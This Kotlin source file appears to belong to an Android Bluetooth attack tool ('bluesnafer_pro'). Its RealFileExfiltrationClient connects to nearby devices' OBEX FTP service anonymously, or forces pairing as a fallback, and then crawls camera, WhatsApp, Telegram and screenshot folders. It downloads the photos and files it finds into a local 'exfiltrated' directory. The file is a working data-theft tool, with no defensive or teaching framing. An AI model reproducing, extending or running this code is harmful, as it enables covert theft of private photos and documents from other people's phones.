package com.bluesnafer_pro

import android.bluetooth.*
import android.content.Context
import android.content.BroadcastReceiver
import android.content.Intent
import android.content.IntentFilter
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.io.*
import java.util.*
import java.util.concurrent.Executors

/**
 * Real OBEX FTP client for file exfiltration.
 * Connects to remote device's OBEX FTP service (UUID 00001106)
 * and attempts to list/download files.
 */
object RealFileExfiltrationClient {
    private const val TAG = "RealFileExfiltration"
    private val OBEX_FTP_UUID = UUID.fromString("00001106-0000-1000-8000-00805F9B34FB")
    private val executor = Executors.newCachedThreadPool()
    private var appContext: Context? = null

    // Common Android OBEX FTP paths to try
    private val commonPaths = listOf(
        "/", "/telecom/", "/SIM1/telecom/",
        "/DCIM/", "/DCIM/Camera/",
        "/Pictures/", "/Download/",
        "/WhatsApp/", "/WhatsApp/Media/",
        "/Documents/"
    )

    // Rutas de galería por fabricante (recorrido recursivo para fotos)
    private val galleryRoots = listOf(
        "/DCIM", "/Pictures", "/Download", "/WhatsApp/Media",
        "/Telegram/Telegram Images", "/Telegram/Telegram Video",
        "/Screenshots", "/Documents", "/Internal Storage/DCIM",
        "/Phone/DCIM", "/Phone/Pictures", "/sdcard/DCIM",
        "/MIUI/Gallery/cloud", "/storage/emulated/0/DCIM"
    )

    // Subcarpetas típicas de cámara (recorridas con profundidad limitada)
    private val gallerySubdirs = listOf(
        "Camera", "100ANDRO", "100MEDIA", "101MEDIA", "DCIM", "thumbnails",
        "WhatsApp Images", "Screenshots", "ScreenShots", "Reception", "FastStone"
    )

    private val imageExtensions = setOf(
        "jpg", "jpeg", "png", "gif", "webp", "heic", "heif", "bmp", "tiff"
    )

    private fun isImageName(name: String): Boolean {
        val lower = name.lowercase(Locale.ROOT)
        val ext = lower.substringAfterLast('.', "")
        return ext in imageExtensions
    }

    fun init(context: Context) {
        appContext = context
    }

    /**
     * Descarga un archivo remoto específico vía OBEX FTP (RFCOMM).
     */
    fun downloadRemoteFile(device: BluetoothDevice, remoteFilePath: String): Map<String, Any> {
        val normalized = remoteFilePath.trim().ifEmpty { return mapOf("success" to false, "error" to "Empty path") }
        val fileName = normalized.substringAfterLast('/').ifEmpty { normalized.removePrefix("/") }
        val parentPath = normalized.substringBeforeLast('/', "/").let {
            if (it.isEmpty() || it == fileName) "/" else if (it.startsWith("/")) it else "/$it"
        }

        BluesnaferLogger.d(TAG, "OBEX download -> $normalized")
        return try {
            val session = openObexSession(device) { BluesnaferLogger.d(TAG, it) }
            if (session.first == null || session.second <= 0) {
                return mapOf("success" to false, "error" to "OBEX connect falló (inseguro + socket seguro tras bonding)")
            }
            val socket = session.first!!
            val input = socket.inputStream
            val output = socket.outputStream
            val maxPacket = session.second

            if (!obexSetPath(input, output, parentPath, maxPacket)) {
                socket.close()
                return mapOf("success" to false, "error" to "OBEX set-path failed for $parentPath")
            }

            val bytes = obexDownloadFile(input, output, fileName, maxPacket)
            socket.close()

            if (bytes == null || bytes <= 0L) {
                return mapOf("success" to false, "error" to "No data received for $fileName")
            }

            val ctx = appContext ?: BluetoothMethodHandler.getAppContext()
            val savedName = fileName.substringAfterLast("/").ifEmpty { fileName }
            val localFile = ctx?.let { File(it.filesDir, "exfiltrated/$savedName") }

            mapOf(
                "success" to true,
                "file" to savedName,
                "size" to bytes.toInt(),
                "path" to (localFile?.absolutePath ?: savedName),
                "remotePath" to normalized,
                "transport" to "RFCOMM_OBEX_FTP"
            )
        } catch (e: Throwable) {
            mapOf("success" to false, "error" to (e.message ?: "OBEX download failed"))
        }
    }

    /**
     * Connect to OBEX FTP service, try common paths, download files.
     */
    fun attemptFileConnection(device: BluetoothDevice, onLog: (String) -> Unit): Map<String, Any> {
        BluesnaferLogger.d(TAG, "OBEX FTP -> ${device.address}")
        onLog("[OBEX] Conectando a OBEX FTP...")
        return try {
            val session = openObexSession(device) { onLog(it) }
            if (session.first == null || session.second <= 0) {
                return mapOf("success" to false,
                    "error" to "OBEX connect falló (inseguro + socket seguro tras bonding)")
            }
            val socket = session.first!!
            val maxPacketLen = session.second
            val input = socket.inputStream
            val output = socket.outputStream
            onLog("[OBEX] CONNECT OK (maxPacket=$maxPacketLen)")

            // Phase 2: Try each common path
            val allFiles = mutableListOf<Map<String, Any>>()
            var totalDownloads = 0
            var totalBytes = 0L

            for (path in commonPaths) {
                try {
                    // Navigate to path
                    val setPathOk = obexSetPath(input, output, path, maxPacketLen)
                    if (!setPathOk) continue

                    // List files in this path
                    val folderFiles = obexListFolder(input, output, maxPacketLen)
                    if (folderFiles.isEmpty()) continue

                    onLog("[OBEX] ${folderFiles.size} archivos en $path")
                    for (f in folderFiles) {
                        if (totalDownloads >= 15) break // Limit to 15 files total
                        try {
                            val dl = obexDownloadFile(input, output, f, maxPacketLen)
                            if (dl != null) {
                                totalDownloads++
                                totalBytes += dl
                                onLog("[OBEX] ✓ Descargado $f ($dl bytes)")
                                allFiles.add(mapOf("name" to f, "size" to dl, "path" to path))
                            }
                        } catch (_: Exception) {}
                    }
                } catch (_: Exception) {}
            }

            socket.close()
            return mapOf(
                "success" to (totalDownloads > 0),
                "message" to if (totalDownloads > 0)
                    "OBEX: $totalDownloads archivos ($totalBytes bytes)"
                else "OBEX: sin archivos encontrados",
                "files" to totalDownloads,
                "totalBytes" to totalBytes,
                "errors" to emptyList<String>()
            )
        } catch (e: Throwable) {
            BluesnaferLogger.e(TAG, "OBEX: ${e.message}")
            onLog("[OBEX] ✗ ${e.message}")
            return mapOf("success" to false, "error" to (e.message ?: "OBEX falló"))
        }
    }

    // --- OBEX helpers ---

    /**
     * Abre una sesión OBEX intentando primero el socket INSEGURO (anónimo) y, si
     * el objetivo lo rechaza, hace bonding (createBond) y reintenta con socket
     * SEGURO autenticado. Devuelve Pair(socket, maxPacket); socket null o
     * maxPacket<=0 indica que ningún método conectó (honesto, sin fabricar).
     */
    private fun openObexSession(
        device: BluetoothDevice,
        onLog: (String) -> Unit
    ): Pair<BluetoothSocket?, Int> {
        var socket: BluetoothSocket? = null
        try {
            // 1) Intento anónimo/inseguro (perfiles OBEX "abiertos")
            socket = device.createInsecureRfcommSocketToServiceRecord(OBEX_FTP_UUID)
            socket!!.connect()
            val resp = obexConnect(socket!!.inputStream, socket!!.outputStream)
            if (resp.first == 0xA0) {
                onLog("[OBEX] CONNECT OK (inseguro/anónimo)")
                return Pair(socket, resp.second)
            }
            onLog("[OBEX] Inseguro rechazado: 0x${resp.first.toString(16)}")
            socket!!.close()
            socket = null
        } catch (e: Throwable) {
            onLog("[OBEX] Inseguro falló: ${e.message}")
            try { socket?.close() } catch (_: Exception) {}
            socket = null
        }
        // 2) Fallback: bonding + socket seguro (usa la clave del vínculo)
        if (ensureBonded(device, onLog)) {
            try {
                socket = device.createRfcommSocketToServiceRecord(OBEX_FTP_UUID)
                socket!!.connect()
                val resp = obexConnect(socket!!.inputStream, socket!!.outputStream)
                if (resp.first == 0xA0) {
                    onLog("[OBEX] CONNECT OK (seguro tras bonding)")
                    return Pair(socket, resp.second)
                }
                socket!!.close()
                socket = null
            } catch (e: Throwable) {
                onLog("[OBEX] Fallback socket seguro falló: ${e.message}")
                try { socket?.close() } catch (_: Exception) {}
            }
        }
        return Pair(null, 0)
    }

    /** Empareja (createBond) con timeout; true si ya estaba emparejado o el bond terminó en BONDED. */
    private fun ensureBonded(device: BluetoothDevice, onLog: (String) -> Unit): Boolean {
        if (device.bondState == BluetoothDevice.BOND_BONDED) {
            onLog("[OBEX] Ya emparejado; reutilizando bond.")
            return true
        }
        onLog("[OBEX] createBond() en curso (puede requerir confirmación en el objetivo)...")
        return try {
            val ctx = appContext ?: BluetoothMethodHandler.getAppContext()
            val latch = CountDownLatch(1)
            val receiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    if (intent?.action == BluetoothDevice.ACTION_BOND_STATE_CHANGED) {
                        val state = intent.getIntExtra(
                            BluetoothDevice.EXTRA_BOND_STATE,
                            BluetoothDevice.BOND_NONE
                        )
                        if (state == BluetoothDevice.BOND_BONDED || state == BluetoothDevice.BOND_NONE) {
                            latch.countDown()
                        }
                    }
                }
            }
            val started = device.createBond()
            if (!started) return false
            val arrived = if (ctx != null) {
                try {
                    ctx.registerReceiver(receiver, IntentFilter(BluetoothDevice.ACTION_BOND_STATE_CHANGED))
                    latch.await(8000, TimeUnit.MILLISECONDS)
                } catch (_: Exception) {
                    latch.await(8000, TimeUnit.MILLISECONDS)
                }
            } else {
                Thread.sleep(2000)
                device.bondState == BluetoothDevice.BOND_BONDED
            }
            try { if (ctx != null) ctx.unregisterReceiver(receiver) } catch (_: Exception) {}
            onLog("[OBEX] createBond terminó: state=${device.bondState}")
            arrived && device.bondState == BluetoothDevice.BOND_BONDED
        } catch (e: Exception) {
            onLog("[OBEX] createBond error: ${e.message}")
            false
        }
    }

    /**
     * Extrae imágenes del dispositivo objetivo: recorrido recursivo de la
     * galería (DCIM/Pictures/WhatsApp/Telegram/...) vía OBEX FTP, descarga
     * solo archivos de imagen y los guarda en filesDir/exfiltrated/images/.
     * Devuelve {success, images: [{name,size,remotePath,localPath,modified}],
     * totalBytes, imagesCount}.
     */
    fun extractImages(device: BluetoothDevice, onLog: (String) -> Unit, maxImages: Int = 30, maxDepth: Int = 3): Map<String, Any> {
        BluesnaferLogger.d(TAG, "OBEX extractImages -> ${device.address}")
        onLog("[GALLERY] Extrayendo fotos de ${device.address}...")
        return try {
            val session = openObexSession(device) { onLog(it) }
            if (session.first == null || session.second <= 0) {
                return mapOf("success" to false, "error" to "OBEX connect falló (inseguro + socket seguro tras bonding)")
            }
            val socket = session.first!!
            val maxPacket = session.second
            val input = socket.inputStream
            val output = socket.outputStream
            onLog("[GALLERY] CONNECT OK")

            val images = mutableListOf<Map<String, Any>>()
            val visited = mutableSetOf<String>()
            var totalBytes = 0L

            for (root in galleryRoots) {
                if (images.size >= maxImages) break
                try {
                    if (obexSetPath(input, output, root, maxPacket)) {
                        walkGallery(
                            input, output, maxPacket, root, 0, maxDepth,
                            images, visited, onLog, maxImages
                        )
                        totalBytes = images.sumOf { (it["size"] as? Long) ?: 0L }
                    }
                } catch (_: Exception) {}
            }

            socket.close()

            if (images.isEmpty()) {
                return mapOf(
                    "success" to false,
                    "note" to "Sin imágenes accesibles (galería protegida o perfil OBEX sin permisos)",
                    "images" to emptyList<Map<String, Any>>(),
                    "imagesCount" to 0,
                    "totalBytes" to 0L
                )
            }

            onLog("[GALLERY] ✓ ${images.size} fotos extraídas ($totalBytes bytes)")
            mapOf(
                "success" to true,
                "images" to images,
                "imagesCount" to images.size,
                "totalBytes" to totalBytes,
                "message" to "Galería: ${images.size} imágenes ($totalBytes bytes)"
            )
        } catch (e: Throwable) {
            BluesnaferLogger.e(TAG, "extractImages: ${e.message}")
            onLog("[GALLERY] ✗ ${e.message}")
            mapOf("success" to false, "error" to (e.message ?: "OBEX gallery extraction failed"))
        }
    }

    private fun walkGallery(
        input: InputStream,
        output: OutputStream,
        maxPacket: Int,
        path: String,
        depth: Int,
        maxDepth: Int,
        results: MutableList<Map<String, Any>>,
        visited: MutableSet<String>,
        onLog: (String) -> Unit,
        maxImages: Int
    ) {
        if (depth > maxDepth || results.size >= maxImages) return
        if (!visited.add(path)) return

        val entries = obexListFolderDetailed(input, output, maxPacket)
        if (entries.isEmpty()) return

        val subdirs = entries.filter { it["folder"] == true }.map { it["name"].toString() }
        val imageFiles = entries.filter { it["folder"] != true && isImageName(it["name"].toString()) }

        if (imageFiles.isNotEmpty()) {
            onLog("[GALLERY] ${imageFiles.size} imágenes en $path")
        }

        for (entry in imageFiles) {
            if (results.size >= maxImages) break
            val name = entry["name"].toString()
            try {
                // Navegar de vuelta a la carpeta actual (algunos servidores mantienen estado)
                val remotePath = if (path == "/") "/$name" else "$path/$name"
                val local = obexDownloadImageToStorage(input, output, name, maxPacket, path)
                if (local != null) {
                    results.add(
                        mapOf(
                            "name" to name,
                            "size" to (entry["size"] as? Long ?: local.length()),
                            "remotePath" to remotePath,
                            "localPath" to local.absolutePath,
                            "modified" to (entry["modified"] ?: "")
                        )
                    )
                    onLog("[GALLERY] ✓ $name (${local.length()} bytes)")
                }
            } catch (_: Exception) {}
        }

        // Recurrir en subcarpetas interesantes (cámara, WhatsApp, screenshots)
        for (dir in subdirs) {
            if (results.size >= maxImages) break
            val relevant = gallerySubdirs.any { dir.equals(it, ignoreCase = true) }
            if (!relevant && depth >= 1) continue
            val childPath = if (path == "/") "/$dir" else "$path/$dir"
            if (obexSetPath(input, output, childPath, maxPacket)) {
                walkGallery(input, output, maxPacket, childPath, depth + 1, maxDepth, results, visited, onLog, maxImages)
                // Volver a la carpeta padre para continuar la iteración
                obexSetPath(input, output, path, maxPacket)
            }
        }
    }

    /**
     * Listado de carpeta OBEX detallado: distingue <folder> de <file> y
     * captura size/modified. Devuelve [{name, folder, size, modified}].
     */
    private fun obexListFolderDetailed(input: InputStream, output: OutputStream, maxPacket: Int): List<Map<String, Any>> {
        val typeHeader = "x-obex/folder-listing"
        val typeBytes = typeHeader.toByteArray(Charsets.UTF_8)
        val pktLen = 7 + typeBytes.size
        val pkt = ByteArray(pktLen)
        pkt[0] = 0x83.toByte() // GET (final)
        pkt[1] = ((pktLen shr 8) and 0xFF).toByte()
        pkt[2] = (pktLen and 0xFF).toByte()
        pkt[3] = 0x42.toByte() // Type header
        pkt[4] = (((typeBytes.size + 3) shr 8) and 0xFF).toByte()
        pkt[5] = ((typeBytes.size + 3) and 0xFF).toByte()
        pkt[6] = 0x00
        System.arraycopy(typeBytes, 0, pkt, 7, typeBytes.size)
        output.write(pkt)
        output.flush()

        Thread.sleep(300)
        val resp = ByteArray(maxPacket.coerceAtLeast(8192))
        val read = readAll(input, resp, resp.size, 4000)
        if (read < 3) return emptyList()

        val code = resp[0].toInt() and 0xFF
        if (code != 0x90 && code != 0xA0) return emptyList()

        val body = String(resp, 3, (read - 3).coerceAtLeast(0), Charsets.UTF_8)
        val entries = mutableListOf<Map<String, Any>>()

        // <folder name="..."> vs <file name="..." size="..." modified="...">
        val filePattern = """<file\s+([^>]*)""".toRegex()
        for (m in filePattern.findAll(body)) {
            val attrs = m.groupValues[1]
            val name = Regex("""name\s*=\s*"([^"]+)"""").find(attrs)?.groupValues?.get(1)?.trim() ?: continue
            if (name.isEmpty() || name == "." || name == "..") continue
            val size = Regex("""size\s*=\s*"(\d+)"""").find(attrs)?.groupValues?.get(1)?.toLongOrNull() ?: 0L
            val modified = Regex("""modified\s*=\s*"([^"]+)"""").find(attrs)?.groupValues?.get(1) ?: ""
            entries.add(mapOf("name" to name, "folder" to false, "size" to size, "modified" to modified))
        }

        if (entries.isEmpty()) {
            // Fallback: XML sin <file> (algunos servidores devuelven <x-obex/...>)
            val folderPattern = """<folder\s+([^>]*)""".toRegex()
            for (m in folderPattern.findAll(body)) {
                val name = Regex("""name\s*=\s*"([^"]+)"""").find(m.groupValues[1])?.groupValues?.get(1)?.trim() ?: continue
                if (name.isEmpty() || name == "." || name == "..") continue
                entries.add(mapOf("name" to name, "folder" to true, "size" to 0L, "modified" to ""))
            }
        }

        return entries.take(60)
    }

    /**
     * Descarga una imagen con soporte multi-paquete OBEX (0x90 continue →
     * headers de body 0x49/0x48) y la guarda en filesDir/exfiltrated/images/.
     */
    private fun obexDownloadImageToStorage(
        input: InputStream,
        output: OutputStream,
        fileName: String,
        maxPacket: Int,
        remoteDir: String
    ): File? {
        val nameBytes = fileName.toByteArray(Charsets.UTF_8)
        val pktLen = 7 + nameBytes.size
        val pkt = ByteArray(pktLen)
        pkt[0] = 0x83.toByte() // GET final
        pkt[1] = ((pktLen shr 8) and 0xFF).toByte()
        pkt[2] = (pktLen and 0xFF).toByte()
        pkt[3] = 0x01 // Name header
        pkt[4] = (((nameBytes.size + 3) shr 8) and 0xFF).toByte()
        pkt[5] = ((nameBytes.size + 3) and 0xFF).toByte()
        pkt[6] = 0x00
        System.arraycopy(nameBytes, 0, pkt, 7, nameBytes.size)
        output.write(pkt)
        output.flush()

        val buffer = ByteArray(maxPacket.coerceAtLeast(8192))
        val ctx = appContext ?: BluetoothMethodHandler.getAppContext()
        val dir = File(File(ctx?.filesDir ?: File("."), "exfiltrated"), "images")
        dir.mkdirs()

        val safeBase = fileName.substringAfterLast("/").replace(Regex("[^A-Za-z0-9._-]"), "_")
        val localFile = File(dir, "${System.currentTimeMillis()}_$safeBase")

        val out = FileOutputStream(localFile)
        var gotAnyBody = false
        var total = 0L

        try {
            // Primer paquete (el GET ya se envió arriba)
            while (true) {
                val read = readAll(input, buffer, buffer.size, 5000)
                if (read < 3) break
                val code = buffer[0].toInt() and 0xFF
                if (code != 0x90 && code != 0xA0) {
                    if (!gotAnyBody) return null
                    break
                }

                // Parsear headers (hi 1 + hlen 2 big-endian)
                var offset = 3
                var bodyFound = false
                while (offset + 2 < read) {
                    val hi = buffer[offset].toInt() and 0xFF
                    val hlen = ((buffer[offset + 1].toInt() and 0xFF) shl 8) or (buffer[offset + 2].toInt() and 0xFF)
                    if (hlen < 3 || offset + hlen > read) break
                    if (hi == 0x48 || hi == 0x49) { // Body final / no final
                        out.write(buffer, offset + 3, hlen - 3)
                        total += (hlen - 3).toLong()
                        gotAnyBody = true
                        bodyFound = true
                    }
                    offset += hlen
                }

                if (code == 0xA0 || (!bodyFound && code == 0x90)) break

                // Continuar: GET vacío con body header 0x49 (len 3)
                if (code == 0x90) {
                    val cont = byteArrayOf(0x83.toByte(), 0x00, 0x06, 0x49, 0x00, 0x03)
                    output.write(cont)
                    output.flush()
                    Thread.sleep(120)
                }
            }
        } catch (e: Exception) {
            BluesnaferLogger.w(TAG, "download image interrupted: ${e.message}")
        } finally {
            out.flush()
            out.close()
        }

        if (!gotAnyBody || total == 0L) {
            localFile.delete()
            return null
        }
        return localFile
    }

    private fun obexConnect(input: InputStream, output: OutputStream): Pair<Int, Int> {
        val connect = byteArrayOf(
            0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x40, 0x00  // Max 16384
        )
        output.write(connect)
        output.flush()

        val resp = ByteArray(7)
        val read = readAll(input, resp, 7, 5000)
        if (read < 3) return Pair(-1, 0)

        val code = resp[0].toInt() and 0xFF
        val len = ((resp[1].toInt() and 0xFF) shl 8) or (resp[2].toInt() and 0xFF)
        val maxPacket = if (resp.size > 5)
            ((resp[5].toInt() and 0xFF) shl 8) or (resp[6].toInt() and 0xFF)
        else 4096
        return Pair(code, maxPacket.coerceAtMost(16384))
    }

    private fun obexSetPath(input: InputStream, output: OutputStream, path: String, maxPacket: Int): Boolean {
        if (path == "/") return true

        val cleanPath = path.trimStart('/').trimEnd('/')
        if (cleanPath.isEmpty()) return true

        val dirs = cleanPath.split("/")
        for (dir in dirs) {
            val nameBytes = dir.toByteArray(Charsets.UTF_8)
            val pktLen = 5 + nameBytes.size
            val pkt = ByteArray(pktLen)
            pkt[0] = 0xC6.toByte() // SetPath
            pkt[1] = ((pktLen shr 8) and 0xFF).toByte()
            pkt[2] = (pktLen and 0xFF).toByte()
            pkt[3] = 0x00 // Flags: don't go back
            pkt[4] = 0x00 // Constants
            System.arraycopy(nameBytes, 0, pkt, 5, nameBytes.size)

            output.write(pkt)
            output.flush()
            Thread.sleep(80)

            val resp = ByteArray(3)
            readAll(input, resp, 3, 3000)
            val code = resp[0].toInt() and 0xFF
            if (code != 0xA0 && code != 0x90) return false
        }
        return true
    }

    private fun obexListFolder(input: InputStream, output: OutputStream, maxPacket: Int): List<String> {
        // Send GET with Type header for folder-listing
        val typeHeader = "x-obex/folder-listing"
        val typeBytes = typeHeader.toByteArray(Charsets.UTF_8)
        val pktLen = 7 + typeBytes.size
        val pkt = ByteArray(pktLen)
        pkt[0] = 0x83.toByte() // GET (final)
        pkt[1] = ((pktLen shr 8) and 0xFF).toByte()
        pkt[2] = (pktLen and 0xFF).toByte()
        pkt[3] = 0x42.toByte() // Type header
        pkt[4] = (((typeBytes.size + 3) shr 8) and 0xFF).toByte()
        pkt[5] = ((typeBytes.size + 3) and 0xFF).toByte()
        pkt[6] = 0x00
        System.arraycopy(typeBytes, 0, pkt, 7, typeBytes.size)
        output.write(pkt)
        output.flush()

        Thread.sleep(300)
        val resp = ByteArray(maxPacket)
        val read = readAll(input, resp, resp.size, 4000)
        if (read < 3) return emptyList()

        val code = resp[0].toInt() and 0xFF
        if (code != 0x90 && code != 0xA0) return emptyList()

        // Parse XML folder listing for filenames
        val body = String(resp, 3, (read - 3).coerceAtLeast(0), Charsets.UTF_8)
        val files = mutableListOf<String>()

        // Match <file name="..."> or simpler filename patterns
        val namePattern = """name\s*=\s*"([^"]+)""".toRegex()
        val matches = namePattern.findAll(body)
        for (m in matches) {
            val fname = m.groupValues[1].trim()
            if (fname.isNotEmpty() && fname != "." && fname != "..") {
                files.add(fname)
            }
        }

        // Try plain listing if XML parsing gave nothing
        if (files.isEmpty()) {
            val lines = body.split(Regex("[\n\r]"))
            for (line in lines) {
                val trimmed = line.trim()
                if (trimmed.isNotEmpty() && trimmed.length > 2 && trimmed.contains(".")) {
                    files.add(trimmed)
                }
            }
        }
        return files.take(30)
    }

    private fun obexDownloadFile(input: InputStream, output: OutputStream,
                                  fileName: String, maxPacket: Int): Long? {
        val nameBytes = fileName.toByteArray(Charsets.UTF_8)
        val pktLen = 7 + nameBytes.size
        val pkt = ByteArray(pktLen)
        pkt[0] = 0x83.toByte() // GET final
        pkt[1] = ((pktLen shr 8) and 0xFF).toByte()
        pkt[2] = (pktLen and 0xFF).toByte()
        pkt[3] = 0x01 // Name header
        pkt[4] = (((nameBytes.size + 3) shr 8) and 0xFF).toByte()
        pkt[5] = ((nameBytes.size + 3) and 0xFF).toByte()
        pkt[6] = 0x00
        System.arraycopy(nameBytes, 0, pkt, 7, nameBytes.size)

        output.write(pkt)
        output.flush()
        Thread.sleep(200)

        val buffer = ByteArray(maxPacket)
        val totalRead = readAll(input, buffer, buffer.size, 5000)
        if (totalRead < 3) return null

        val code = buffer[0].toInt() and 0xFF
        if (code != 0x90 && code != 0xA0) return null

        // Extract body (after headers). Skip OBEX header (3 bytes) + optional headers
        val bodyLen = totalRead - 3
        if (bodyLen <= 0) return null

        val fileData = ByteArray(bodyLen)
        System.arraycopy(buffer, 3, fileData, 0, bodyLen)

        // Save to internal storage
        val ctx = appContext ?: return bodyLen.toLong()
        val dir = File(ctx.filesDir, "exfiltrated")
        dir.mkdirs()
        val localFile = File(dir, fileName.substringAfterLast("/").ifEmpty { "file_${System.currentTimeMillis()}" })
        try {
            FileOutputStream(localFile).use { it.write(fileData) }
        } catch (_: Exception) {}

        return bodyLen.toLong()
    }

    private fun readAll(input: InputStream, buffer: ByteArray, maxLen: Int, timeoutMs: Int): Int {
        var total = 0
        val deadline = System.currentTimeMillis() + timeoutMs
        while (total < maxLen && System.currentTimeMillis() < deadline) {
            val read = try { input.read(buffer, total, maxLen - total) } catch (_: Exception) { -1 }
            if (read < 0) break
            total += read
        }
        return total
    }
}

